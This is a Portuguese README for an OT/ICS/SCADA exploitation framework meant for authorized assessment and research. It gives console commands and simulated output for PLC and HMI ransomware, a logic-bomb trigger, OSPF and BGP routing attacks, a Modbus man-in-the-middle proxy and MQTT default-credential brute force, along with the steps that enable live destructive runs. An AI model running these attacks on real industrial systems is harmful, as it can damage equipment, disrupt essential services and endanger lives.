![IndustrialXPL-Forge](docs/img/industrialxpl_forge-banner_16x9-en_us.png)

# IndustrialXPL-Forge (IXF)

> **O Maior Framework de Assessment e Exploração de Segurança OT/ICS/SCADA do Mundo**
> Parte da suite XPL-Forge | Autor: André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://uniaogeek.com.br/)

[![PyPI](https://img.shields.io/pypi/v/industrialxpl-forge?color=red&label=PyPI)](https://pypi.org/project/industrialxpl-forge/)
[![Python](https://img.shields.io/pypi/pyversions/industrialxpl-forge?color=blue&label=Python)](https://pypi.org/project/industrialxpl-forge/)
[![Licença: MIT](https://img.shields.io/badge/Licen%C3%A7a-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://img.shields.io/github/actions/workflow/status/mrhenrike/IndustrialXPL-Forge/ci.yml?branch=master&label=CI)](https://github.com/mrhenrike/IndustrialXPL-Forge/actions)
[![Módulos](https://img.shields.io/badge/M%C3%B3dulos-972%2B-brightgreen)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![Vendors](https://img.shields.io/badge/Vendors-150%2B-orange)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![Protocolos](https://img.shields.io/badge/Protocolos-50%2B-blue)](https://github.com/mrhenrike/IndustrialXPL-Forge)
[![MITRE ATT&CK ICS](https://img.shields.io/badge/MITRE%20ATT%26CK%20ICS-v19-red)](https://attack.mitre.org/matrices/ics/)
[![Plataforma](https://img.shields.io/badge/Plataforma-OT%20%7C%20ICS%20%7C%20SCADA%20%7C%20IIoT-darkred)](https://github.com/mrhenrike/IndustrialXPL-Forge)

**Python-First. Implementação pura em Python — instale e execute com um único `pip install`.**

---

## Início Rápido

```bash
pip install industrialxpl
ixf
```

Ou a partir do código-fonte:

```bash
git clone https://github.com/mrhenrike/IndustrialXPL-Forge
cd IndustrialXPL-Forge
pip install -r requirements.txt
python ixf.py
```

---

## O que é o IXF?

O IndustrialXPL-Forge é um framework modular, nativo em Python, para **assessment de segurança e exploração** em ambientes de **Tecnologia Operacional (OT)**, **Sistemas de Controle Industrial (ICS)**, **SCADA**, **IHM (HMI)**, **CLP (PLC)**, **RTU**, **DCS** e **IIoT**.

Cobre o **ciclo completo de ataque**:

```
OSINT → Descoberta → Fingerprint → Verificação de Vulnerabilidade → Exploit → Relatório
```

**Funcionalidades principais:**
- **Python-First**: toda a funcionalidade central funciona com `pip install industrialxpl` — runtimes externos (C, Go, Java) são aceleradores opcionais com fallback Python embutido
- **SafeMode por padrão**: todo módulo executa em modo simulação — imprime o payload sem enviar
- **MITRE ATT&CK for ICS v19**: 79 técnicas mapeadas, sintaxe `ttp T0843 192.168.1.100`
- **Cobertura de CVEs**: 3.300+ CVEs ICS/OT de CVSS 0,1 a 10,0
- **50 vendors**: Siemens, Schneider, Rockwell, ABB, Honeywell, WEG, NOVA Smar, e mais
- **50 protocolos**: Modbus, S7comm, EtherNet/IP, DNP3, BACnet, IEC-104, OPC UA, PROFINET, e mais

---

## Exemplos de Uso

```
# Abrir o shell interativo do IXF
ixf

# Carregar e executar um módulo (modo simulação por padrão — seguro)
ixf > use scanners/ics/modbus_detect
ixf > set target 192.168.1.100
ixf > check

# Executar um TTP-ID contra um alvo
ixf > ttp T0843 192.168.1.100          # Program Download — todos os módulos
ixf > ttp T0878 10.0.0.0/24            # Alarm Suppression — varredura de sub-rede
ixf > ttp-list --tactic evasion        # Listar TTP-IDs de Evasão

# Varredura MITRE ATT&CK for ICS
ixf > mitre-scan discovery 192.168.1.0/24
ixf > mitre-scan evasion 192.168.1.100
ixf > mitre-all 192.168.1.100          # Todas as 79 técnicas (simular por padrão)
ixf > mitre-coverage                   # % de cobertura por tática

# Módulos específicos de CVE
ixf > cve CVE-2026-25895               # FUXA SCADA RCE pré-auth
ixf > cve CVE-2015-5374               # Siemens SIPROTEC4 DoS
ixf > cve-scan 192.168.1.0/24         # Descobrir ativos + testar todos os CVEs

# Gerar relatórios
ixf > report json
ixf > mitre-report layer               # Layer JSON para ATT&CK Navigator
```

---

## SafeMode / DestructiveMode

**Todo módulo é executado em modo simulação por padrão** — imprime o que FARIA sem enviar nenhum pacote.

```
ixf (FrostyGoop) > run                 # SIMULAÇÃO: imprime payload, não envia
ixf (FrostyGoop) > set simulate false
ixf (FrostyGoop) > set destructive true
ixf (FrostyGoop) > run                 # AO VIVO: exibe banner + exige confirmação
```

Níveis de impacto exigem confirmação proporcional:
- `INFO/READ`: automático
- `CRITICAL`: digitar a string completa de confirmação
- `CATASTROPHIC`: digitar string + aguardar 10 segundos

Todas as operações destrutivas são registradas em `.log/destructive_ops_AAAA-MM-DD.log`.

---

## Documentação

Documentação completa disponível em inglês e português brasileiro:

| Idioma | Link |
|--------|------|
| English (en-US) | [docs/en-us/](docs/en-us/_index.md) |
| Português (pt-BR) | [docs/pt-br/](docs/pt-br/_index.md) |

**Links rápidos:**

| Tópico | en-US | pt-BR |
|--------|-------|-------|
| Instalação | [01-installation](docs/en-us/01-installation.md) | [01-instalacao](docs/pt-br/01-instalacao.md) |
| Início Rápido | [02-quick-start](docs/en-us/02-quick-start.md) | [02-inicio-rapido](docs/pt-br/02-inicio-rapido.md) |
| Referência do Shell (35 comandos) | [03-shell-reference](docs/en-us/03-shell-reference.md) | [03-referencia-shell](docs/pt-br/03-referencia-shell.md) |
| Sistema de Módulos | [04-module-system](docs/en-us/04-module-system.md) | [04-sistema-modulos](docs/pt-br/04-sistema-modulos.md) |
| SafeMode / DestructiveMode | [05-safemode](docs/en-us/05-safemode-destructivemode.md) | [05-safemode](docs/pt-br/05-safemode-destructivemode.md) |
| MITRE ATT&CK for ICS | [06-mitre](docs/en-us/06-mitre-attack-ics.md) | [06-mitre](docs/pt-br/06-mitre-attack-ics.md) |
| SAST / LLM | [07-sast](docs/en-us/07-sast-llm.md) | [07-sast](docs/pt-br/07-sast-llm.md) |
| Protocolos e Vendors | [08-protocols](docs/en-us/08-protocols-vendors.md) | [08-protocolos](docs/pt-br/08-protocolos-vendors.md) |
| Desenvolvimento de Módulos | [09-dev](docs/en-us/09-module-development.md) | [09-desenvolvimento](docs/pt-br/09-desenvolvimento-modulos.md) |
| PolyExploit Runner | [11-poly](docs/en-us/11-poly-exploit-runner.md) | [11-poly](docs/pt-br/11-poly-exploit-runner.md) |
| Assessment e Conformidade | [12-assessment](docs/en-us/12-assessment-compliance.md) | [12-assessment](docs/pt-br/12-assessment-conformidade.md) |

---

## BLOCO J - Categorias de Ataque (v2.0.0)

> **AVISO LEGAL:** Todos os modulos desta secao sao destinados **exclusivamente a testes de seguranca autorizados, pesquisa e uso educacional**. A execucao contra sistemas sem autorizacao expressa e por escrito configura crime federal de acordo com as leis de fraude cibernetica. Os autores e a Uniao Geek nao assumem responsabilidade por uso indevido.

### Ransomware (OT/ICS) - Apenas Simulacao Educacional

> **AVISO:** Modulos de ransomware sao ESTRITAMENTE em modo simulacao por padrao.
> Confirmacao tripla obrigatoria para execucao ao vivo. Uso nao autorizado e crime federal.

```bash
ixf > use exploits/ransomware/plc_project_locker
ixf (PLCProjectLocker) > set target 192.168.1.10
ixf (PLCProjectLocker) > set port 502
ixf (PLCProjectLocker) > set simulate true   # Flag de seguranca obrigatoria
ixf (PLCProjectLocker) > run

[SIMULATE] Conexao Modbus TCP para 192.168.1.10:502
[SIMULATE] Zeraria registradores holding: FC16 @ addr 0 len 125
[SIMULATE] 2 requisicoes FC16 necessarias (123 + 2 registradores)
[SIMULATE] Impacto: PLC pararia execucao do programa - TTP CISA AA26-097A
[!] Para executar ao vivo: set simulate false, set destructive true
[!] Em seguida, digite a string de confirmacao: I_UNDERSTAND_THIS_IS_DESTRUCTIVE
```

```bash
ixf > use exploits/ransomware/hmi_display_ransomware
ixf (HMIDisplayRansomware) > set target 192.168.1.20
ixf (HMIDisplayRansomware) > set display_register 1000
ixf (HMIDisplayRansomware) > set simulate true
ixf (HMIDisplayRansomware) > run

[SIMULATE] Escreveria 20 registradores (40 chars) no registrador Modbus 1000
[SIMULATE] Tela do HMI exibiria: "YOUR SYSTEM IS LOCKED..."
[SIMULATE] Baseado no TTP de manipulacao de HMI do TRITON/TRISIS
[!] Gate triplo obrigatorio para execucao ao vivo
```

| Modulo | Caminho | Impacto | Requer |
|--------|---------|---------|--------|
| `plc_project_locker` | `exploits/ransomware/` | CATASTROFICO | Gate triplo |
| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTROFICO | Gate triplo |

### Persistencia

> **AVISO:** Modulos de logic bomb simulam a ativacao de rotinas pre-plantadas no PLC. A execucao nao autorizada interrompe processos fisicos.

```bash
ixf > use exploits/persistence/plc_logic_bomb_inject
ixf (PLCLogicBombActivate) > set target 192.168.1.10
ixf (PLCLogicBombActivate) > set trigger_register 9999
ixf (PLCLogicBombActivate) > set trigger_value 0xDEAD
ixf (PLCLogicBombActivate) > set simulate true
ixf (PLCLogicBombActivate) > run

[SIMULATE] Escreveria valor 0xDEAD (57005) no registrador holding 9999
[SIMULATE] Em 192.168.1.10:502 unit_id=1 usando FC16
[SIMULATE] Se uma rotina de logic bomb monitorar o registrador 9999, ela sera ativada
[SIMULATE] Baseado nos TTPs do malware ICS INCONTROLLER/PIPEDREAM (Dragos 2022)
[!] Set destructive true para executar apos confirmacao
```

| Modulo | Caminho | Impacto | Referencia |
|--------|---------|---------|-----------|
| `plc_logic_bomb_inject` | `exploits/persistence/` | ALTO | CISA AA22-103A, Dragos CHERNOVITE |

### Envenenamento de Tabela de Roteamento

> **AVISO:** Ataques de injecao de rota redirecionam trafego de rede e podem interromper servicos OT/IT em producao. Apenas para laboratório autorizado.

```bash
ixf > use exploits/routing/ospf_lsa_inject
ixf (OSPFLSAInject) > set iface eth0
ixf (OSPFLSAInject) > set area_id 0.0.0.0
ixf (OSPFLSAInject) > set poison_prefix 10.0.0.0
ixf (OSPFLSAInject) > set simulate true
ixf (OSPFLSAInject) > run

[SIMULATE] LSA OSPF Tipo Router (Tipo 1) seria construido:
[SIMULATE]   Area: 0.0.0.0 / Router-ID: 192.168.1.100
[SIMULATE]   Rede: 10.0.0.0/255.255.255.0 via metrica=1
[SIMULATE] Pacote LSU (72 bytes): 02010024...
[SIMULATE] Seria enviado para 224.0.0.5 (AllSPFRouters) x3 na eth0
[!] PRE-REQUISITO: Scapy + segmento de rede rodando OSPF (sem autenticacao)
```

```bash
ixf > use exploits/routing/bgp_vortex_dos
ixf (BGPVortexDoS) > set target 10.0.0.1
ixf (BGPVortexDoS) > set attacker_as 65001
ixf (BGPVortexDoS) > set victim_as 65000
ixf (BGPVortexDoS) > set simulate true
ixf (BGPVortexDoS) > run

[SIMULATE] Estabeleceria sessao BGP para 10.0.0.1:179
[SIMULATE] UPDATE-A: AS_PATH=[65001,65000] MED=100 COMMUNITY=65001:100
[SIMULATE] UPDATE-B: WITHDRAW + re-announce AS_PATH=[65001] MED=200
[SIMULATE] UPDATE-C: AS_PATH=[65001,65000,65001] MED=50 COMMUNITY=65001:50
[SIMULATE] Essas mensagens causam oscilacao persistente no Processo de Decisao BGP (Efeito Vortex)
[SIMULATE] Referencia: Stoeger et al., USENIX Security 2025 - BGP Vortex
```

| Modulo | Caminho | Impacto | Referencia |
|--------|---------|---------|-----------|
| `ospf_lsa_inject` | `exploits/routing/` | ALTO | DCmal-2025 OSPF spoofing (MDPI 2025), RFC 2328 |
| `bgp_vortex_dos` | `exploits/routing/` | ALTO | Stoeger et al., USENIX Security 2025 |

### MiTM - Proxy Modbus TCP Inline

> **AVISO:** O proxy inline com injecao de valores falsifica leituras de sensores entregues aos operadores. Pode causar julgamento incorreto do processo com consequencias fisicas. Apenas laboratorio autorizado.

```bash
ixf > use assessment/lateral/modbus_mitm_inline
ixf (ModbusMiTM) > set target 192.168.1.10       # PLC
ixf (ModbusMiTM) > set listen_host 0.0.0.0
ixf (ModbusMiTM) > set listen_port 1502           # Porta do proxy do atacante
ixf (ModbusMiTM) > set simulate true
ixf (ModbusMiTM) > run

[SIMULATE] Ligaria proxy TCP em 0.0.0.0:1502
[SIMULATE] Encaminharia todas as conexoes para o PLC real em 192.168.1.10:502
[SIMULATE] Todos os frames Modbus registrados com info de codigo de funcao decodificada

# Captura passiva ao vivo (sem injecao de valores):
ixf (ModbusMiTM) > set simulate false
ixf (ModbusMiTM) > run

[*] Proxy Modbus MiTM iniciado em 0.0.0.0:1502
[*] Encaminhando para 192.168.1.10:502
[+] Cliente conectado: 192.168.1.50
[>] FC3 ReadHoldingRegs addr=0 count=10 -> PLC
[<] Resposta: 10 registradores [0x0001, 0x00F2, ...]
[>] FC16 WriteRegs addr=0 data=[...] -> PLC  [REGISTRADO]
```

| Modulo | Caminho | Impacto | Pre-requisitos |
|--------|---------|---------|----------------|
| `modbus_mitm_inline` | `assessment/lateral/` | ALTO | ARP poisoning ativo (usar modbus_arp_mitm primeiro) |

### Ataques de Credenciais

```bash
ixf > use creds/generic/ics_mqtt_bruteforce
ixf (MQTTBruteforce) > set target 192.168.1.50
ixf (MQTTBruteforce) > set port 1883
ixf (MQTTBruteforce) > set simulate true
ixf (MQTTBruteforce) > run

[SIMULATE] Tentaria 18 pares de credenciais contra o broker MQTT em 192.168.1.50:1883
[SIMULATE] Primeiros 5: admin:admin, admin:password, admin:, :, guest:guest
[SIMULATE] Fonte: padroes ICS integrados (Mosquitto, HiveMQ, EMQX, especificos SCADA)
```

| Modulo | Caminho | Impacto | Referencia |
|--------|---------|---------|-----------|
| `ics_mqtt_bruteforce` | `creds/generic/` | MEDIO | OASIS MQTT v3.1.1, MITRE T0806 |

### Resumo de Cobertura

| Categoria | Modulos | Modo Padrao |
|-----------|---------|------------|
| Ransomware / Impacto | `plc_project_locker`, `hmi_display_ransomware` | simulate=True (gate triplo para ao vivo) |
| Persistencia | `plc_logic_bomb_inject` | simulate=True |
| Roteamento (RTP) | `ospf_lsa_inject`, `bgp_vortex_dos` | simulate=True |
| MiTM | `modbus_arp_mitm`, `modbus_mitm_inline` | simulate=True |
| Credenciais | `ics_mqtt_bruteforce`, + 30+ modulos vendor | simulate=True |
| CVE 2025 | `siemens_telecontrol_cve_2025` | simulate=True |

Todos os modulos destrutivos utilizam `simulate=True` por padrao. Modulos de ransomware/wiper exigem confirmacao de gate triplo: `simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`.

Esta ferramenta é destinada **exclusivamente a testes de segurança autorizados, pesquisa e fins educacionais**.

O uso do IndustrialXPL-Forge contra sistemas que você não possui ou para os quais não tem **autorização expressa e por escrito** é **ilegal** e pode violar leis de fraude cibernética.

Sistemas OT/ICS controlam infraestruturas físicas críticas. O uso não autorizado pode causar:
- Danos físicos a equipamentos industriais
- Interrupção de serviços essenciais (energia, água, gás, manufatura)
- Lesões pessoais ou mortes
- Penalidades legais significativas

**Os autores e a União Geek não assumem responsabilidade por uso indevido. Os usuários assumem total responsabilidade legal e ética por todas as ações realizadas com esta ferramenta.**

---

## Autor e Créditos

**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://uniaogeek.com.br/)

Fontes dos módulos: EmbedXPL-Forge (irmão da suite), ISF/ICSSploit, ModBusSploit, n-days-poc-benchmark, InduGuard, pesquisa ZeronTek OT Hunt, CISA ICS-CERT advisories, Vedere Labs OT:ICEFALL, catálogo ExploitDB ICS, PoCs públicos no GitHub.
